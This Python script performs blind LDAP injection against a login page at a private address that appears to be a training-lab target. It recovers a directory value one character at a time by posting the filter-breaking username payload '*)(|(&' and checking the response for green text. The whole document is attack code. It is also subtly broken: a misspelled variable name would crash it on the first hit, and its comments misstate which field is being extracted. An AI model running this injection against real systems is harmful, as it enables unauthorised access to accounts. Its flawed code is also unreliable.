import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://10.10.173.8/blind.php'

# define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# init variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        print(f"Trying password character: {char}")

        # adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}
                                                        
        # send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # parse HTML
        soup = BeautifulSoup(response.content, 'html.parser')

        # adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            succesful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")
print(f"Final succcessful payload: {successful_chars}")